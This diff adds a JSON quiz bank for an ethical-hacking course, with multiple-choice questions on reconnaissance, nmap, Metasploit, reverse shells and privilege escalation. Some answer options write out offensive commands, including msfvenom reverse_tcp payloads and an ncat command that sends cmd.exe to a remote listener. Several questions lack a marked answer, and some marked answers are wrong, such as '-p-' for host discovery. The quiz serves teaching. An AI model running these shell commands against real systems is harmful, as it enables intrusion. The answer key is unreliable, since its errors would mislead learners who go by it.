@@ -1,0 +1,340 @@
+[
+    {
+        "name": "LP1",
+        "questions": [
+            {
+                "question": "@`wotf activity is considered as active reconnaissance?",
+                "type": 1,
+                "options": [
+                    "Browsing through the company's official website in search of employee email addresses.",
+                    "Looking through an official job advertisement for a systems administrator position through the newspaper.",
+                    "[]Perform social engineering by calling the IT helpdesk of the company, asking for a password reset for an important employee.",
+                    "Running the WHOIS command on www.yahoo.com"
+                ]
+            },
+            {
+                "question": "Which installation mode allows a user to quickly revert Kali Linux to the last known /working configuration should it be corrupted? Select the BEST answer.",
+                "type": 1,
+                "options": [
+                    "Live CD",
+                    "Live USB",
+                    "Hard Drive Installation",
+                    "[]Virtual Machine"
+                ]
+            },
+            {
+                "question": "@`wotf is NOT considered as a reconnaissance activity conducted by a hacker?",
+                "type": 1,
+                "options": [
+                    "Gathering details on the CEO of a company using social media tools such as Linkedin.",
+                    "Performing an NSlookup on the mail exchange server of a company.",
+                    "[]Clearing all log entries in the event viewer of a compromised machine.",
+                    "Running the command theharvester -d companyBel.com -b google > records.txt on the terminal."
+                ]
+            },
+            {
+                "question": "@`wotf BEST describes a Script Kiddie?",
+                "type": 1,
+                "options": [
+                    "An expert programmer who creates his own Trojan/Backdoor program using Python.",
+                    "A disgruntled HR manager who deletes all data on the HR systems upon receiving news that he will be fired.",
+                    "[]An IT enthusiast who downloads sample malware from Github with the intention of testing it on a public server.",
+                    "An IT expert who automates system backup procedures using PowerShell and Cron jobs."
+                ]
+            },
+            {
+                "question": "@`wotf is the MOST important aspect when conducting a penetration test?",
+                "type": 1,
+                "options": [
+                    "Documenting all actions and evidences.",
+                    "Handling serious threats immediately.",
+                    "[]Receiving a formal written agreement stating the do's and don'ts during the penetration test.",
+                    "Provide recommendations to fix the vulnerabilities"
+                ]
+            },
+            {
+                "question": "@`wotf detection methods uses established baselines and behaviours for detecting intrusions?",
+                "type": 1,
+                "options": [
+                    "Host-based Detection",
+                    "Network-based Detection",
+                    "Signature-based Detection",
+                    "[]Anomaly-based Detection"
+                ]
+            },
+            {
+                "question": "Malcom is on a system internal to the network and has no knowledge of the target's network. Therefore, he is performing an internal, black-box test. What is the main difference between a traditional hacker and ethical hacker?",
+                "type": 1,
+                "options": [
+                    "No difference",
+                    "The tools they use",
+                    "[]Predefined scope and agreement made with the system owner",
+                    "Ethical hackers never exploit vulnerabilities; they only point out their existence."
+                ]
+            },
+            {
+                "question": "An attacker left a seemingly harmless thumb drive containing a PDF document embedded with a malicious payload in the parking lot. The payload will be launched automatically upon the insertion of the thumb drive, giving the attacker the ability to send arbitrary commands to the target over an unauthorized backdoor. Which phase in the Cyber Kill Chain is NOT involved here?",
+                "type": 1,
+                "options": [
+                    "[]Reconnaisance",
+                    "Delivery",
+                    "Installation",
+                    "Command & Control"
+                ]
+            },
+            {
+                "question": "Which of the following software/tool is not found in Kali Linux?",
+                "type": 1,
+                "options": [
+                    "John the Ripper",
+                    "Metasploit",
+                    "[]ipconfig",
+                    "whois"
+                ]
+            },
+            {
+                "question": "@`wotf are valid information gathered during reconnaissance?",
+                "type": 2,
+                "options": [
+                    "[]IP addresses of reachable systems",
+                    "Bandwidth consumption",
+                    "[]Email addresses of employees",
+                    "USB transfer speed"
+                ]
+            },
+            {
+                "question": "@`wotf information is needed when setting a static IP address in Kali Linux?",
+                "type": 2,
+                "options": [
+                    "[]Default gateway",
+                    "[]Subnet mask",
+                    "Public IP address",
+                    "Wi-Fi network name"
+                ]
+            }
+        ]
+    },
+    {
+        "name": "LP2",
+        "questions": [
+            {
+                "question": "@`wotf is/are true of the SSH protocol?",
+                "type": 1,
+                "options": [
+                    "SSH sends passwords in plaintext",
+                    "[]SSH is a client/server remote terminal access protocol",
+                    "SSH is a protocol analyzer",
+                    "The standard TCP port 21 has been assigned for contacting SSH servers"
+                ]
+            },
+            {
+                "question": "@`wotf software tools is used primarily for vulnerability scanning?",
+                "type": 1,
+                "options": [
+                    "ncat",
+                    "Metasploit",
+                    "[]Nessus",
+                    "nmap"
+                ]
+            },
+            {
+                "question": "What is the default port number used by the NetBIOS protocol?",
+                "type": 1,
+                "options": [
+                    "443",
+                    "3389",
+                    "445",
+                    "[]139"
+                ]
+            },
+            {
+                "question": "Which service runs on port 23 by default?",
+                "type": 1,
+                "options": [
+                    "[]Telnet",
+                    "DNS",
+                    "HTTP",
+                    "SSH"
+                ]
+            },
+            {
+                "question": "What does a TCP RST packet do?",
+                "type": 1,
+                "options": [
+                    "Starts a TCP connection",
+                    "Resets the TCP connection",
+                    "Restores the connection to a previous state",
+                    "Finishes a TCP connection"
+                ]
+            },
+            {
+                "question": "What is the proper sequence of a TCP connection?",
+                "type": 1,
+                "options": [
+                    "SYN, PSH, ACK",
+                    "[]SYN, SYN/ACK, ACK",
+                    "SYN, ACK, FIN",
+                    "SYN, SYNACK, ACK"
+                ]
+            },
+            {
+                "question": "Which tool can be used to perform a DNS zone transfer on Windows?",
+                "type": 1,
+                "options": [
+                    "DNS lookup",
+                    "whois",
+                    "ipconfig",
+                    "nslookup"
+                ]
+            },
+            {
+                "question": "@`wotf is a passive online attack?",
+                "type": 1,
+                "options": [
+                    "Password guessing",
+                    "Brute-force attack",
+                    "[]Network sniffing",
+                    "Dictionary attack"
+                ]
+            },
+            {
+                "question": "@`wotf nmap options is used primarily for scanning up and running hosts, without discovering any open/closed ports/services?",
+                "type": 1,
+                "options": [
+                    "-s ICMP",
+                    "-sI",
+                    "-sn",
+                    "[]-p-"
+                ]
+            },
+            {
+                "question": "Which command is used in Metasploit to start a command prompt session on a Windows target?",
+                "type": 1,
+                "options": [
+                    "[]shell",
+                    "cmd",
+                    "terminal",
+                    "cmd.exe"
+                ]
+            },
+            {
+                "question": "Which option in the shutdown command is used to show a popup message before shutdown?",
+                "type": 1,
+                "options": [
+                    "-p \"Shutdown\"",
+                    "[]-c \"Shutdown\"",
+                    "-msg \"Shutdown\"",
+                    "-m \"Shutdown\""
+                ]
+            },
+            {
+                "question": "@`wotf correctly describes what happens when you run nmap 192.168.1.0/24?",
+                "type": 2,
+                "options": [
+                    "Nmap only scans 192.168.1.1",
+                    "[]Nmap is scanning the whole 192.168.1.0 network",
+                    "[]By default, SYN scan is used",
+                    "By default, TCP connect scan is used"
+                ]
+            },
+            {
+                "question": "@`wotf nmap options can be used to scan open/closed ports from 1 through 65535?",
+                "type": 2,
+                "options": [
+                    "-p all",
+                    "-p -1",
+                    "-p 0",
+                    "[]-p-",
+                    "[]-p *"
+                ]
+            }
+        ]
+    },
+    {
+        "name": "LP3",
+        "questions": [
+            {
+                "question": "@`wotf commands produces a 32-bit reverse shell executable file meant to be executed on an x86 computer?",
+                "type": 1,
+                "options": [
+                    "set payload windows/meterpreter/reverse_tcp",
+                    "LHOST= 192.168.0.1 LPORT-4444 msfvenom-p windows/meterpreter/reverse_tcp",
+                    "[]msfvenom-p windows/meterpreter/reverse_tcp",
+                    "msfvenom-p windows/x64/meterpreter/reverse_tcp"
+                ]
+            },
+            {
+                "question": "Which command is used to set the Metasploit options in order for the reverse shell setup to listen to port 5566?",
+                "type": 1,
+                "options": [
+                    "[]set lport 5566",
+                    "set listen_port 5566",
+                    "set listenport 5566",
+                    "set port 5566"
+                ]
+            },
+            {
+                "question": "Which of the following is FALSE about password salting?",
+                "type": 1,
+                "options": [
+                    "It helps defend against the Rainbow table attack",
+                    "It is not used in Windows systems",
+                    "Hash for two users with the same passwords will be different",
+                    "Lengthens the password since salt is prepended or appended"
+                ]
+            },
+            {
+                "question": "What is necessary in order to install a hardware keylogger on a target system?",
+                "type": 1,
+                "options": [
+                    "The IP address of the system",
+                    "[]Physical access to the system",
+                    "The username and password of the administrator",
+                    "Telnet access to the system"
+                ]
+            },
+            {
+                "question": "What is the easiest method to get a password?",
+                "type": 1,
+                "options": [
+                    "Brute-force attack",
+                    "Dictionary attack",
+                    "Hybrid attack",
+                    "[]Social Engineering"
+                ]
+            },
+            {
+                "question": "Which command is used by the attacker in reverse shell?",
+                "type": 1,
+                "options": [
+                    "[]sudo ncat -nlvp 4444",
+                    "sudo ncat -nv 192.168.1.1 4444",
+                    "sudo ncat -nv 192.168.1.1 4444 -e cmd.exe",
+                    "sudo ncat -nlvp 192.168.1.1 4444"
+                ]
+            },
+            {
+                "question": "@`wotf are true with regards to privilege escalation?",
+                "type": 2,
+                "options": [
+                    "On Windows, the highest privilege an attacker can attain is \"administrator\"",
+                    "[]Escalated Privilege is needed to obtain the password hashes of users",
+                    "[]Under certain conditions, the getsystem command can be used in Meterpreter for privilege escalation",
+                    "ncat is used mainly for privilege escalation",
+                    "There is no need for Privilege Escalation since all exploit in Metasploit allows the attacker to gain root access"
+                ]
+            },
+            {
+                "question": "@`wotf are classified as exploits in Metasploit?",
+                "type": 2,
+                "options": [
+                    "[]windows/smb/eternalblue_doublepulsar",
+                    "targetarchitecture x86",
+                    "[]windows/local/ms10_015_kitrap0d",
+                    "windows/meterpreter/reverse_tcp",
+                    "uripath lucky_draw/winner.aspx"
+                ]
+            }
+        ]
+    }
+]
